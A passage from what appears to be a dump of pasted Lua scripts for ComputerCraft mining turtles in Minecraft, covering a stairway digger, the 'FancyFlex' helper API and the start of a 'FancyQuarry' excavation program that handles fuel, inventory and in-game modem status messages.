              local total_depth = dy
              local current_y = dig.gety()
              local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

              local estimated_time_display = ""Calculating...""
              if estimated_remaining_levels > 0 then
                  local avg_time_per_level = 30
                  local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                  local hours = math.floor(estimated_time_seconds / 3600)
                  local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                  local seconds = math.floor(estimated_time_seconds % 60)
                  estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
              end

              local status = {
                  type = ""status"",
                  fuel = turtle.getFuelLevel(),
                  inventory = dig.getInventory(),
                  position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                  is_mining = true,
                  estimated_time = estimated_time_display
              }
              modem.transmit(flex.modem_channel, replyChannel, status)
          elseif message.command == ""unload_command"" then
              flex.send(""Received unload command, initiating unload..."", colors.yellow)
              dig.dropNotFuel()
              flex.send(""Unload complete."", colors.lightBlue)
              modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
          end
      end
  end

 direction = dig.getr()
end --while


avoidBedrock()
if not dig.fwd() then avoidBedrock() end
if not endcap(1) then avoidBedrock() end
if not dig.fwd() then avoidBedrock() end
if not endcap(1,true) then avoidBedrock() end

dig.left(2)
while not turtle.detect() do
 dig.fwd()
 -- Handle remote commands while returning to edge
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
              local status = {
                  type = ""status"",
                  fuel = turtle.getFuelLevel(),
                  inventory = dig.getInventory(),
                  position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                  is_mining = true, -- Still working
                  estimated_time = ""Returning to edge..."" -- Placeholder
              }
              modem.transmit(flex.modem_channel, replyChannel, status)
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end
 if event ~= nil then sleep(0.1) end
end --while
dig.back()

-- This bit compensates for random Bedrock (mostly)
if #dig.getKnownBedrock() > 0 then
 for x=1,4 do
  dig.placeDown()
  dig.right()
  dig.fwd()
 end --for
end --for



----------------------------------------------
-- ¬†/¬Ø]¬†|¬Ø\¬†¬†/\¬†¬†|¬Ø¬Ø]¬†[¬Ø¬Ø]¬†[¬Ø¬Ø]¬†|\¬†||¬†¬†/¬Ø¬Ø]¬†--
-- |¬†[¬†¬†|¬†/¬†|¬†¬†|¬†|¬†]¬†¬†¬†||¬†¬†¬†][¬†¬†|¬†\¬†|¬†|¬†[¬Ø|¬†--
-- ¬†\_]¬†|¬†\¬†||||¬†||¬†¬†¬†¬†||¬†¬†[__]¬†||¬†\|¬†¬†\__|¬†--
----------------------------------------------


local function placeStairs()
 local x,y,z,slot
 slot = turtle.getSelectedSlot()
 y = turtle.getItemCount()
 z = true

 if y < 2 or not flex.isItem(""stairs"") then
  for x=1,16 do
   turtle.select(x)
   y = turtle.getItemCount()
   if y >= 2 and flex.isItem(""stairs"") then
    z = false
    break
   end --if
  end --for

  if z then
   turtle.select(slot)
   return false
  end --if
 end --if

 dig.placeDown()
 dig.right()
 dig.fwd()
 dig.left()
 dig.placeDown()
 dig.left()
 dig.fwd()
 dig.right()
end --function


flex.send(""Returning to surface"",
  colors.yellow)

function isDone()
 -- Reached Surface
 return dig.gety() >= 0
end

-- Follow the Spiral [and place Stairs]
while not isDone() do
 -- Handle remote commands during ascent
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
              local total_depth = dy
              local current_y = dig.gety()
              local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

              local estimated_time_display = ""Calculating...""
              if estimated_remaining_levels > 0 then
                  local avg_time_per_level = 30
                  local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                  local hours = math.floor(estimated_time_seconds / 3600)
                  local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                  local seconds = math.floor(estimated_time_seconds % 60)
                  estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
              end

              local status = {
                  type = ""status"",
                  fuel = turtle.getFuelLevel(),
                  inventory = dig.getInventory(),
                  position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                  is_mining = true, -- Still working
                  estimated_time = estimated_time_display
              }
              modem.transmit(flex.modem_channel, replyChannel, status)
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end
 if event ~= nil then sleep(0.1) end


 if dig.getr()%360 == 0 then
  while dig.getz() < dig.getzmax()-1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
   -- Handle remote commands during steps
    local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
    if event == ""modem_message"" then
        local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
        if type(message) == ""table"" and message.type == ""command"" then
            if message.command == ""status_request"" then
                 local total_depth = dy
                 local current_y = dig.gety()
                 local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

                 local estimated_time_display = ""Calculating...""
                 if estimated_remaining_levels > 0 then
                     local avg_time_per_level = 30
                     local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                     local hours = math.floor(estimated_time_seconds / 3600)
                     local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                     local seconds = math.floor(estimated_time_seconds % 60)
                     estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
                 end

                 local status = {
                     type = ""status"",
                     fuel = turtle.getFuelLevel(),
                     inventory = dig.getInventory(),
                     position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                     is_mining = true,
                     estimated_time = estimated_time_display
                 }
                 modem.transmit(flex.modem_channel, replyChannel, status)
            elseif message.command == ""unload_command"" then
                flex.send(""Received unload command, initiating unload..."", colors.yellow)
                dig.dropNotFuel()
                flex.send(""Unload complete."", colors.lightBlue)
                modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
            end
        end
    end
  end

 elseif dig.getr()%360 == 90 then
  while dig.getx() < dig.getxmax()-1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
   -- Handle remote commands during steps
    local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
    if event == ""modem_message"" then
        local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
        if type(message) == ""table"" and message.type == ""command"" then
            if message.command == ""status_request"" then
                 local total_depth = dy
                 local current_y = dig.gety()
                 local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

                 local estimated_time_display = ""Calculating...""
                 if estimated_remaining_levels > 0 then
                     local avg_time_per_level = 30
                     local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                     local hours = math.floor(estimated_time_seconds / 3600)
                     local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                     local seconds = math.floor(estimated_time_seconds % 60)
                     estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
                 end

                 local status = {
                     type = ""status"",
                     fuel = turtle.getFuelLevel(),
                     inventory = dig.getInventory(),
                     position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                     is_mining = true,
                     estimated_time = estimated_time_display
                 }
                 modem.transmit(flex.modem_channel, replyChannel, status)
            elseif message.command == ""unload_command"" then
                flex.send(""Received unload command, initiating unload..."", colors.yellow)
                dig.dropNotFuel()
                flex.send(""Unload complete."", colors.lightBlue)
                modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
            end
        end
    end
  end

 elseif dig.getr()%360 == 180 then
  while dig.getz() > dig.getzmin()+1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if dig.gety() > -4 and dig.getz()
      == dig.getzmin()+1 then
    -- Up at the top
    dig.fwd()
    dig.up()
    placeStairs()
   end --if
   if isDone() then break end
   -- Handle remote commands during steps
    local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
    if event == ""modem_message"" then
        local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
        if type(message) == ""table"" and message.type == ""command"" then
            if message.command == ""status_request"" then
                 local total_depth = dy
                 local current_y = dig.gety()
                 local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

                 local estimated_time_display = ""Calculating...""
                 if estimated_remaining_levels > 0 then
                     local avg_time_per_level = 30
                     local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                     local hours = math.floor(estimated_time_seconds / 3600)
                     local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                     local seconds = math.floor(estimated_time_seconds % 60)
                     estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
                 end

                 local status = {
                     type = ""status"",
                     fuel = turtle.getFuelLevel(),
                     inventory = dig.getInventory(),
                     position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                     is_mining = true,
                     estimated_time = estimated_time_display
                 }
                 modem.transmit(flex.modem_channel, replyChannel, status)
            elseif message.command == ""unload_command"" then
                flex.send(""Received unload command, initiating unload..."", colors.yellow)
                dig.dropNotFuel()
                flex.send(""Unload complete."", colors.lightBlue)
                modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
            end
        end
    end
  end

 elseif dig.getr()%360 == 270 then
  while dig.getx() > dig.getxmin()+1 do
   dig.fwd()
   dig.up()
   placeStairs()
   if isDone() then break end
   -- Handle remote commands during steps
    local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
    if event == ""modem_message"" then
        local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
        if type(message) == ""table"" and message.type == ""command"" then
            if message.command == ""status_request"" then
                 local total_depth = dy
                 local current_y = dig.gety()
                 local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

                 local estimated_time_display = ""Calculating...""
                 if estimated_remaining_levels > 0 then
                     local avg_time_per_level = 30
                     local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                     local hours = math.floor(estimated_time_seconds / 3600)
                     local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                     local seconds = math.floor(estimated_time_seconds % 60)
                     estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
                 end

                 local status = {
                     type = ""status"",
                     fuel = turtle.getFuelLevel(),
                     inventory = dig.getInventory(),
                     position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                     is_mining = true,
                     estimated_time = estimated_time_display
                 }
                 modem.transmit(flex.modem_channel, replyChannel, status)
            elseif message.command == ""unload_command"" then
                flex.send(""Received unload command, initiating unload..."", colors.yellow)
                dig.dropNotFuel()
                flex.send(""Unload complete."", colors.lightBlue)
                modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
            end
        end
    end
  end

 end --if/else

 if not isDone() then dig.left() end

end --while


-- All Done!
turtle.select(1)
dig.goto(0,0,0,0)

if success then
 flex.send(""Stairway finished!"",
   colors.lightBlue)
else
 flex.send(""Reached Origin"",
   colors.lightBlue)
end --if

flex.modemOff()
os.unloadAPI(""dig.lua"")
os.unloadAPI(""flex.lua"")"
y8QVvv1v,FancyFlex,Sedrowow,Lua,Thursday 1st of May 2025 11:18:35 AM CDT,"-- Misc Useful Functions
-- Required by most other programs


-------------------------------------------
-- |¬Ø¬Ø]¬†||¬†¬†¬†|¬Ø¬Ø]¬†\\//¬†¬†¬†¬†¬†/\¬†¬†|¬Ø\¬†[¬Ø¬Ø]¬† --
-- |¬†]¬†¬†||_¬†¬†|¬†]¬†¬†¬†><¬†¬†¬†¬†¬†|¬†¬†|¬†|¬†/¬†¬†][¬†¬† --
-- ||¬†¬†¬†|__]¬†|__]¬†//\\¬†¬†¬†¬†||||¬†||¬†¬†[__]¬† --
-------------------------------------------

local log_file = ""log.txt""
local options_file = ""flex_options.cfg""

-- Defaults; can be changed in config file
local modem_channel = 6464
local name_color
if term.isColor() then
 name_color = ""yellow""
else
 name_color = ""lightGray""
end --if/else


function getPeripheral(name)
 local x,sides
 sides = { ""top"", ""bottom"", ""left"",
           ""right"", ""front"", ""back"" }
 local periph = {}
 for x=1,#sides do
  if peripheral.getType(sides[x]) == name then
   periph[#periph+1] = sides[x]
  end --if
 end --for
 return periph
end --function


local modem
local hasModem = false
local x = getPeripheral(""modem"")
if #x > 0 then
 hasModem = true
 modem = peripheral.wrap(x[1])
 modem.open(modem_channel)
end --if

function modemOff()
 local x = getPeripheral(""modem"")
 if #x > 0 then
  modem.close(modem_channel)
 end --if
end --function


local file
if not fs.exists(log_file) then
 file = fs.open(log_file,""w"")
 file.close()
end --if



function optionsExport()
 if fs.exists(options_file) then
  fs.delete(options_file)
 end
 local file
 while file == nil do
  file = fs.open(options_file,""w"")
 end
 file.writeLine(""# Flex API Options File #\n"")
 file.writeLine(""modem_channel=""
   ..tostring(modem_channel))
 file.writeLine(""name_color=""..name_color..""\n"")
 file.close()
 return true
end --function


function optionsImport()
 if not fs.exists(options_file) then
  return false
 end
 local file
 while file == nil do
  file = fs.open(options_file, ""r"")
 end
 
 local x = file.readLine()
 while x ~= nil do
  if string.find(x,""modem_channel"")==1 then
   modem_channel = tonumber(string.sub(x,15))
  elseif string.find(x,""name_color"")==1 then
   name_color = string.sub(x,12)
  end --if/else
  x = file.readLine()
 end --while
 
 file.close()
 return true
end --function


if not optionsImport() then
 optionsExport()
end --if



--==============================--


-- Inventory Condense
function condense(n)
 if n == nil then n = 1 end
 n = math.floor(n)
 if n < 1 or n > 16 then
  n = 1
 end --if
 
 local x,y,slot
 slot = turtle.getSelectedSlot()
 for x=n+1,16 do
  if turtle.getItemCount(x) > 0 then
   
   for y=n,x-1 do
    if turtle.getItemCount(y) == 0 or
       turtle.getItemDetail(x)[""name""] ==
       turtle.getItemDetail(y)[""name""] and
       turtle.getItemSpace(y) > 0 then
     turtle.select(x)
     turtle.transferTo(y)
    end --if
    if turtle.getItemCount(x) == 0 then
     break
    end --if
   end --for
   
  end --if
 end --for
 turtle.select(slot)
end --function


-- Round n to p decimal places
function round(n,p)
 if p == nil then p = 0 end
 n = n*math.pow(10,p)
 local m = n - math.floor(n)
 if m < 0.5 then
  return math.floor(n) / math.pow(10,p)
 else
  return math.ceil(n) / math.pow(10,p)
 end --if/else
end --function


-- Number to String
-- Optionally a max length if not an integer
function tostr(num,len)
 num = tostring(num)
 local sci = """"
 
 local e = string.find(num,""e"")
 if e ~= nil then
  -- Separate exponent from number
  sci = string.sub(num,e,-1)
  num = string.sub(num,1,e-1)
 end --if
 
 if string.find(num,""%."") ~= nil then
  -- Remove extra zeroes from decimal
  while string.sub(num,string.len(num)) == ""0"" do
   num = string.sub(num,1,string.len(num)-1)..""""
  end --while
 end --if
 
 if string.sub(num,-1) == ""."" then
  -- If all trailing zeroes are gone, erase decimal point
  num = string.sub(num,1,-2)..""""
 end --if
 
 if len == nil then
  -- If no max length specified
  return num..sci..""""
 end --if
 
 while string.len(num) + string.len(sci) > len do
  -- If too long, cut off a decimal digit
  num = string.sub(num,1,-2)..""""
 end --while
 
 return num..sci..""""
 
end --function


-- Evaluate Expression
function eval(expression)
 local solution, err = loadstring(
   ""return ""..expression)
 if err then error(err,2) end
 local sol = pcall(solution)
 if not sol then
  error(""Invalid Expression"",2)
 end
 return solution()
end --function


-- Press any Key
function getKey()
 local event, key_code = os.pullEvent(""key"")
 return key_code
end --function
function keyPress() return getKey() end




-------------------------------
--¬† ¬†¬†[¬Ø¬Ø]¬†|¬Ø¬Ø]¬†\\//¬†[¬Ø¬Ø]¬†   --
--¬†¬† ¬†¬†||¬†¬†|¬†]¬†¬†¬†><¬†¬†¬†||¬†¬†   --
--¬†¬†¬† ¬†||¬†¬†|__]¬†//\\¬†¬†||¬†¬†   --
-------------------------------
-- ¬†/¬Ø]¬†¬†/¬Ø\¬†¬†||¬†¬†¬†¬†/¬Ø\¬†¬†|¬Ø\¬†--
-- |¬†[¬†¬†|¬†O¬†|¬†||_¬†¬†|¬†O¬†|¬†|¬†/¬†--
-- ¬†\_]¬†¬†\_/¬†¬†|__]¬†¬†\_/¬†¬†|¬†\¬†--
-------------------------------

hexchars = ""0123456789ABCDEF""

-- Start with named value, get hex char
function getHex(x)
 if x == nil then
  error(""Number expected, got nil"", 2)
 end
 x = round(math.log(x)/math.log(2))
 if x < 0 or x > 15 then
  error(""Invalid color number"", 2)
 end --if
 return string.sub(hexchars,x+1,x+1)
end --function

-- Start with hex char, get named value
function getVal(x)
 local z = string.find(hexchars,x)
 if z == nil then return nil end
 return math.pow(2,z-1)
end --function

local send_depth, print_depth = 0, 0



-------------------------------
-- Multicolor Print Function --
-------------------------------

function printColors(message,textColor)
 local x,y,z,t,skip,margin
 local xmax,ymax = term.getSize()
 local oldColor = term.getTextColor()
 if textColor == nil then
  textColor = oldColor
 else
  
 end --if
 
 margin = """"
 for x=1,print_depth do
  margin = margin..""  ""
 end --for
 
 if type(message) == ""table"" then
  if print_depth == 0 then
   printColors(""#0{"")
  end --if
  print_depth = print_depth + 1
  
  for x,y in pairs(message) do
   if type(y) == ""table"" then
    printColors(margin..""  ""..tostring(x).."" #0= {"",textColor)
    printColors(y,textColor)
   else
    printColors(margin..""  ""..tostring(x).."" #0= #""..
        getHex(textColor)..tostring(y),textColor)
   end --if/else
  end --for
  
  print_depth = print_depth - 1
  printColors(margin..""#0}"")
  return
  
 end --if
 
 if type(textColor) == ""number"" then
  message = ""#""..getHex(textColor)
            ..tostring(message)
 end --if
 
 for t=1,string.len(message) do
  
  skip = false
  while string.sub(message,t,t) == ""#"" and
        not skip do
   
   -- Found legit ""#""
   if string.sub(message,t+1,t+1) == ""#"" then
    message = string.sub(message,1,t)..
          string.sub(message,t+2)..""""
    skip = true
    
   else
    textColor = getVal(string.sub(message,t+1,t+1))
    
    if textColor == nil then
     textColor = colors.white
    end --if
    
    -- This bit clears out # escapes
    if t == 1 then
     message = string.sub(message,3)..""""
    elseif t < string.len(message) then
     message = string.sub(message,1,t-1)..
           string.sub(message,t+2)..""""
    elseif t == string.len(message) then
     message = string.sub(message,1,t-1)..""""
    end --if/else
    
   end --if
   
   if t > string.len(message) then
    break
   end --if
   
  end --while (is escape char)
  
  if t > string.len(message) then
   break
  end --if
  
  -- Actually Print Character
  x,y = term.getCursorPos()
  term.setTextColor(textColor)
  
  if textColor == colors.gray then
   --term.setBackgroundColor(colors.lightGray)
   
  elseif textColor == colors.black then
   term.setBackgroundColor(colors.lightGray)
   
  end --if/else
  term.write(string.sub(message,t,t))
  term.setBackgroundColor(colors.black)
  
  if t >= string.len(message) then
   break
  end --if
  
  -- Loop Around to Next Row
  xmax,ymax = term.getSize()
  if string.sub(message,t,t) == ""\n"" or x >= xmax then
   x = 1
   if y < ymax-1 then
    y = y + 1
   else
    print("""")
   end --if/else
  else
   x = x + 1
  end --if/else
  term.setCursorPos(x,y)
  
 end --for
 
 term.setTextColor(oldColor)
 print("""")
 
end --function



------------------------------
-- Print/Broadcast Function --
------------------------------

function send(message,textColor)
 local x,y,z,id,nameColor
 local oldColor = term.getTextColor()
 
 local margin = """"
 for x=1,send_depth do
  margin = margin..""  ""
 end --for
 
 if type(message) == ""table"" then
  if send_depth == 0 then
   send(""#0{"")
  end --if
  send_depth = send_depth + 1
  
  for x,y in pairs(message) do
   if type(y) == ""table"" then
    send(margin..""  ""..tostring(x).."" #0= {"",textColor)
    send(y,textColor)
   else
    send(margin..""  ""..tostring(x).."" #0= #""
       ..getHex(textColor)..tostring(y),textColor)
   end --if/else
  end --for
  
  send_depth = send_depth - 1
  send(margin..""#0}"")
  return
  
 end --if
 
 
 if message == nil then
  message = ""nil""
 end --if
 
 message = tostring(message)
 if textColor == nil then
  textColor = colors.white
 end --if
 nameColor = eval(""colors.""..name_color)
 
 printColors(message)
 
 file = fs.open(log_file,""a"")
 file.writeLine(message)
 file.close()
 
 if hasModem then
  id = ""#""..getHex(nameColor)..
       tostring(os.getComputerID())..""#0""
  
  if os.getComputerLabel() ~= nil then
   id = id..""|#""..getHex(nameColor)..
        os.getComputerLabel()..""#0""
  end --if
  
  id = id.."": #""..getHex(textColor)..
       message..""""
  
  modem.transmit(modem_channel,
     modem_channel+1,id)
  sleep(0.1)
 end --if (hasModem)
 
 term.setTextColor(oldColor)
 sleep(0.02)
end --function (print/broadcast)


--================================--


args = {...}

if args[1]==""color"" or args[1]==""colors"" then
 z = """"
 for x=0,15 do
  y = string.sub(hexchars,x+1,x+1)..""""
  z = z..""#""..y..y..""#0 ""
 end --for
 printColors(z)
 return
 
elseif args[1] == ""edit"" then
 shell.run(""edit ""..options_file)
 optionsImport()
 
end --if/else



-------------------------------------------
--¬†/¬Ø¬Ø]¬†|¬Ø¬Ø]¬†[¬Ø¬Ø]¬†¬†¬†¬†|¬Ø\¬†¬†¬†/\¬†¬†[¬Ø¬Ø]¬†¬†/\¬†¬†--
--|¬†[¬Ø|¬†|¬†]¬†¬†¬†||¬†¬†¬†¬†¬†|¬†¬†|¬†|¬†¬†|¬†¬†||¬†¬†|¬†¬†|¬†--
--¬†\__|¬†|__]¬†¬†||¬†¬†¬†¬†¬†|_/¬†¬†||||¬†¬†||¬†¬†||||¬†--
-------------------------------------------


function getBlock(dir)
 dir = dir or ""fwd""
 local block,meta
 
 if dir==""fwd"" then
  block,meta = turtle.inspect()
 elseif dir==""up"" then
  block,meta = turtle.inspectUp()
 elseif dir==""down"" then
  block,meta = turtle.inspectDown()
 end
 
 if block then
  block = meta[""name""]
  meta = meta[""metadata""]
  return block,meta
 else
  return ""minecraft:air"",nil
 end --if
 
end --function

function getBlockUp()
 return getBlock(""up"")
end

function getBlockDown()
 return getBlock(""down"")
end


function isBlock(key,dir)
 if type(key) == ""string"" then
  key = { key }
 end --if
 if type(key) ~= ""table"" then
  error(""Expected string or table, got ""
    ..type(key), 2)
  return false
 end --if
 
 local block = getBlock(dir)
 local x
 for x=1,#key do
  
  if string.find(key[x],"":"") ~= nil then
   if block == key[x] then
    return true
   end --if
   
  else
   if string.find(block,key[x]) ~= nil then
    return true
   end --if
   
  end --if/else
 end --for
 
 return false
end --function

function isBlockUp(key)
 return isBlock(key, ""up"")
end

function isBlockDown(key)
 return isBlock(key, ""down"")
end



local fluid = { ""air"", ""water"", ""lava"",
                ""acid"", ""blood"", ""poison"" }

function isFluid(dir)
 return isBlock(fluid, ""fwd"")
end

function isFluidUp()
 return isBlock(fluid, ""up"")
end

function isFluidDown()
 return isBlock(fluid, ""down"")
end



function isItem(key,slot)
 if key == nil then return false end
 
 local slot_old = turtle.getSelectedSlot()
 if type(slot) ~= ""number"" then
  slot = slot_old
 end --if
 
 if type(key) == ""table"" then
  local x
  for x=1,#key do
   if isItem(key[x],slot) then
    return true
   end --if
  end --for
  return false
 end --if
 
 if turtle.getItemCount(slot) == 0 then
  return false
 end --if
 
 local name = turtle.getItemDetail(slot)[""name""]
 
 return ( string.find(name,key) ~= nil )
end --function


"
fQeui7VE,FancyQuarry,Sedrowow,Lua,Thursday 1st of May 2025 11:17:23 AM CDT,"-- This is a replacement for the
-- 'excavate' program, as it can re-
-- cover from a reboot/unload event.
-- Also avoids destroying spawners!


-----------------------------------
-- [¬Ø¬Ø]¬†||¬†||¬†|¬Ø\¬†[¬Ø¬Ø]¬†||¬†¬†¬†|¬Ø¬Ø]¬†--
-- ¬†||¬†¬†||_||¬†|¬†/¬†¬†||¬†¬†||_¬†¬†|¬†]¬†¬†--
-- ¬†||¬†¬†¬†\__|¬†|¬†\¬†¬†||¬†¬†|__]¬†|__]¬†--
-----------------------------------
-- ¬†/¬Ø\¬†¬†||¬†||¬†¬†/\¬†¬†|¬Ø\¬†|¬Ø\¬†\\//¬†--
-- |¬†O¬†|¬†||_||¬†|¬†¬†|¬†|¬†/¬†|¬†/¬†¬†\/¬†¬†--
-- ¬†\_\\¬†¬†\__|¬†||||¬†|¬†\¬†|¬†\¬†¬†||¬†¬†--
-----------------------------------

os.loadAPI(""flex.lua"")
os.loadAPI(""dig.lua"")
dig.doBlacklist() -- Avoid Protected Blocks
dig.doAttack() -- Attack entities that block the way
dig.setFuelSlot(1)
dig.setBlockSlot(2)
local world_height = 384


local args = {...}
if #args == 0 then
 flex.printColors(
   ""quarry <length> [width] [depth]\n""..
   ""[skip <layers>] [dump] [nolava] [nether]"",
   colors.lightBlue)
 return
end --if


local reloaded = false
if dig.saveExists() then
 reloaded = true
 dig.loadCoords()
end --if
dig.makeStartup(""quarry"",args)


local zmax = tonumber(args[1])
local xmax = tonumber(args[2]) or zmax
local depth = world_height-1
if tonumber(args[2]) ~= nil then
 depth = tonumber(args[3]) or depth
end --if
local ymin = -depth --(1-depth)

if xmax == nil or zmax == nil then
 flex.send(""Invalid dimensions,"",colors.red)
 shell.run(""rm startup.lua"")
 return
end --if


local x
local skip = 0
local lava = true
local dodumps = false

for x=1,#args do

 if args[x] == ""dump"" then
  dodumps = true
 elseif args[x] == ""nolava"" then
  lava = false
 elseif args[x] == ""nether"" then
  dig.setBlockStacks(4)
 end --if

 if args[x] == ""skip"" then
  skip = tonumber(args[x+1])
  if skip == nil then
   flex.printColors(""Please specify skip depth"",
     colors.red)
   dig.saveClear()
   return
  end --if
  if dig.getymin() > -skip then
   dig.setymin(-skip)
  end --if
 end --if

end --for


if not lava then -- Block lava around edges of quarry
 dig.setBlockSlot(0)
 -- Always keep a stack of blocks
end --if




----------------------------------------------
-- |¬Ø¬Ø]||¬†|||\¬†||¬†/¬Ø][¬Ø¬Ø][¬Ø¬Ø]¬†/¬Ø\¬†|\¬†||/¬Ø¬Ø\¬†--
-- |¬†]¬†||_|||¬†\¬†||¬†[¬†¬†||¬†¬†][¬†|¬†O¬†||¬†\¬†|\_¬Ø\¬†--
-- ||¬†¬†¬†\__|||¬†\|¬†\_]¬†||¬†[__]¬†\_/¬†||¬†\|\__/¬†--
----------------------------------------------

local location
local function gotoBase()
 local x = dig.getxlast()
 location = dig.location()
 if dig.gety() < -skip then dig.up() end
 dig.gotox(0)
 dig.gotoz(0)
 dig.gotor(180)
 dig.gotoy(0)
 dig.gotox(0)
 dig.setxlast(x)
 dig.gotoz(0)
 dig.gotor(180)
 return location
end --function

local function returnFromBase(loc)
 local loc = loc or location
 local x = dig.getxlast()
 dig.gotor(0)
 checkFuel()
 dig.gotoy(math.min(loc[2]+1,-skip))
 checkFuel()
 dig.gotoz(loc[3])
 checkFuel()
 dig.gotox(loc[1])
 dig.setxlast(x) -- Important for restoring
 checkFuel()
 dig.gotor(loc[4])
 checkFuel()
 dig.gotoy(loc[2])
end --function



local function checkHalt()
 if not rs.getInput(""top"") then
  return
 end --if
 if dig.gety() == 0 then
  return
 end --if

 local loc,x
 -- Manual halt; redstone signal from above
 flex.send(""Manual halt initiated"", colors.orange)
 flex.printColors(""Press ENTER to resume mining\n""
   ..""or SPACE to return to base"",
   colors.pink)

 while true do
  x = flex.getKey()
  if x == keys.enter then return end
  if x == keys.space then break end
 end --while

 flex.send(""Returning to base"", colors.yellow)
 loc = gotoBase()
 print("" "")
 flex.printColors(""Press ENTER to resume mining"",
   colors.pink)
 while flex.getKey() ~= keys.enter do
  sleep(1)
 end --while

 if dodumps then dig.doDumpDown() end
 dig.dropNotFuel()
 flex.send(""Resuming quarry"",colors.yellow)
 returnFromBase(loc)

end --function



local function checkInv()
 if turtle.getItemCount(16) > 0 then

  if dodumps then
   dig.right(2)
   dig.doDump()
   dig.left(2)
  end --if

  if turtle.getItemCount(14) > 0 then
   local loc = gotoBase()
   dig.dropNotFuel()
   returnFromBase(loc)
  end --if

 end --if
end --function



function checkFuel()
 local a = turtle.getFuelLevel()
 -- This fuel estimate is very basic, you might need to adjust it
 local b = ( zmax + xmax + math.abs(dig.gety() - ymin) ) * 2 -- Estimate moves needed to finish current layer and descend
 local c = true

 while a < b and c do
  for x=1,16 do
   turtle.select(x)
   if turtle.refuel(1) then
    break
   end --if
   if x == 16 then
    c = false
   end --if
  end --for
  a = turtle.getFuelLevel()
 end --while

 if a < b then
  flex.send(""Fuel low, returning to surface"",
    colors.yellow)
  local loc = gotoBase()
  turtle.select(1)
  if dodumps then dig.doDumpDown() end
  while turtle.suckUp() do sleep(0) end
  dig.dropNotFuel()
  dig.refuel(b)
  flex.send(""Fuel aquired!"",colors.lightBlue)
  returnFromBase(loc)
 end --if
end --function



local dug = dig.getdug()
local ydeep = dig.gety() -- Corrected from dig.getymin()
local function checkProgress()
 local a = 1000 --report every <a> blocks dug
 local b = 5 --report every <b> meters descended
 if math.floor(dug/a) < math.floor(dig.getdug()/a) then
  flex.send(""Dug ""..tostring(dig.getdug())..
    "" blocks"",colors.lightBlue)
 end --if
 if math.floor(-ydeep/b) < math.floor(-dig.gety()/b) then
  flex.send(""Descended ""..tostring(-dig.gety())..
    ""m"",colors.green)
 end --if
 dug = dig.getdug()
 ydeep = dig.gety() -- Update ydeep
end --function



local newlayer = false
function checkNewLayer()
 if newlayer then
  -- This encodes whether or not the turtle has
